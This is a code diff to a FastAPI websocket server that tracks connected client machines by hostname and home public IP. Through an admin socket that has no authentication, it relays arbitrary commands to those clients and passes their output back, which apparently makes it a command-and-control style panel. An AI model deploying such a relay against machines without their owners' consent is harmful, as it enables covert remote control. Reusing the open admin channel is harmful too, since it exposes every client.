@@ -1,4 +1,4 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import HTMLResponse
 from fastapi.staticfiles import StaticFiles
@@ -7,6 +7,9 @@ import time
 import json
 import os
 import asyncio
+import logging
+
+logging.basicConfig(level=logging.INFO)
 
 app = FastAPI()
 
@@ -19,132 +22,123 @@ app.add_middleware(
 )
 
 clients = {}
-last_seen = {}
 client_infos = {}
+last_seen = {}
+hostname_map = {}
+public_ip_map = {}
 admin_ws = None
-hostname_map = {}  # hostname → client_id
 
 async def ping_clients():
     while True:
-        now = time.time()
-        to_remove = []
-        for client_id, ws in clients.items():
+        for cid, ws in list(clients.items()):
             try:
                 await ws.send_text("ping")
             except:
-                to_remove.append(client_id)
-        for client_id in to_remove:
-            clients.pop(client_id, None)
-            last_seen.pop(client_id, None)
-            client_infos.pop(client_id, None)
-            for hostname, mapped_id in list(hostname_map.items()):
-                if mapped_id == client_id:
-                    hostname_map.pop(hostname, None)
+                remove_client(cid)
         await asyncio.sleep(10)
 
 @app.on_event("startup")
-async def startup_event():
+async def startup():
     asyncio.create_task(ping_clients())
 
 @app.get("/clients")
-async def list_clients():
+async def get_clients():
+    networks = {}
     now = time.time()
-    result = []
-    for hostname, client_id in hostname_map.items():
-        status = "Online" if now - last_seen.get(client_id, 0) < 20 else "Offline"
-        info = client_infos.get(client_id, {})
-        result.append({
-            "id": client_id,
+    for hostname, cid in hostname_map.items():
+        info = client_infos.get(cid, {})
+        public_ip = info.get("public_ip", "Unknown Network")
+        net_title = f"Home Network {public_ip}"
+        if net_title not in networks:
+            networks[net_title] = []
+        status = "Online" if now - last_seen.get(cid, 0) < 20 else "Offline"
+        networks[net_title].append({
+            "id": cid,
             "hostname": hostname,
             "status": status,
             "info": info
         })
-    return {"clients": result}
+    return networks
+
+@app.post("/logerror")
+async def log_error(req: Request):
+    data = await req.json()
+    logging.error(f"Client Error Report: {json.dumps(data)}")
+    return {"status": "logged"}
 
 @app.websocket("/ws/client/{client_id}")
-async def websocket_client(websocket: WebSocket, client_id: str):
-    await websocket.accept()
-
-    # Warte bis wir client_info haben für hostname
+async def ws_client(ws: WebSocket, client_id: str):
+    await ws.accept()
     sysinfo = None
-    while True:
-        try:
-            msg = await websocket.receive()
-            if "text" in msg:
-                try:
-                    data = json.loads(msg["text"])
-                    if data.get("type") == "client_info":
-                        sysinfo = data.get("data", {})
-                        client_infos[client_id] = sysinfo
-                        break
-                except:
-                    pass
-        except:
-            return  # Falls kein client_info kommt → abbrechen
+    try:
+        while True:
+            data = await ws.receive_text()
+            msg = json.loads(data)
+            if msg.get("type") == "client_info":
+                sysinfo = msg.get("data", {})
+                break
+    except:
+        return
 
     hostname = sysinfo.get("hostname", client_id)
+    public_ip = sysinfo.get("public_ip", "unknown")
 
-    # Check: existiert schon Client für hostname → alte Verbindung schließen
+    # replace old
     old_id = hostname_map.get(hostname)
     if old_id and old_id != client_id:
-        old_ws = clients.get(old_id)
-        if old_ws:
-            await old_ws.close()
-        clients.pop(old_id, None)
-        last_seen.pop(old_id, None)
-        client_infos.pop(old_id, None)
+        try:
+            await clients[old_id].close()
+        except:
+            pass
+        remove_client(old_id)
 
-    clients[client_id] = websocket
+    clients[client_id] = ws
+    client_infos[client_id] = sysinfo
     hostname_map[hostname] = client_id
+    public_ip_map[client_id] = public_ip
     last_seen[client_id] = time.time()
 
     try:
         while True:
-            data = await websocket.receive()
+            msg = await ws.receive()
             last_seen[client_id] = time.time()
-            if "text" in data:
-                msg = data["text"]
-                if msg == "pong":
-                    continue
-                try:
-                    obj = json.loads(msg)
-                    if obj.get("type") == "client_info":
-                        client_infos[client_id] = obj.get("data", {})
-                        continue
-                except:
-                    pass
+            if "text" in msg and msg["text"] != "pong":
                 if admin_ws:
-                    await admin_ws.send_text(f"[{client_id}] {msg}")
-            elif "bytes" in data:
+                    await admin_ws.send_text(f"[{client_id}] {msg['text']}")
+            elif "bytes" in msg:
                 if admin_ws:
-                    await admin_ws.send_bytes(data["bytes"])
+                    await admin_ws.send_bytes(msg["bytes"])
     except WebSocketDisconnect:
-        clients.pop(client_id, None)
-        last_seen.pop(client_id, None)
-        client_infos.pop(client_id, None)
-        if hostname_map.get(hostname) == client_id:
-            hostname_map.pop(hostname, None)
+        remove_client(client_id)
 
 @app.websocket("/ws/admin")
-async def websocket_admin(websocket: WebSocket):
+async def ws_admin(ws: WebSocket):
     global admin_ws
-    await websocket.accept()
-    admin_ws = websocket
+    await ws.accept()
+    admin_ws = ws
     try:
         while True:
-            msg = await websocket.receive_json()
+            msg = await ws.receive_json()
             target = msg.get("target")
             cmd = msg.get("cmd")
             if target in clients:
                 await clients[target].send_text(cmd)
-    except WebSocketDisconnect:
+    except:
         admin_ws = None
 
 @app.get("/")
-async def serve_index():
+async def root():
     with open("static/index.html") as f:
-        html_content = f.read()
-    return HTMLResponse(content=html_content, status_code=200)
+        return HTMLResponse(f.read())
+
+def remove_client(cid):
+    clients.pop(cid, None)
+    client_infos.pop(cid, None)
+    last_seen.pop(cid, None)
+    public_ip_map.pop(cid, None)
+    for host, id_ in list(hostname_map.items()):
+        if id_ == cid:
+            hostname_map.pop(host)
 
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
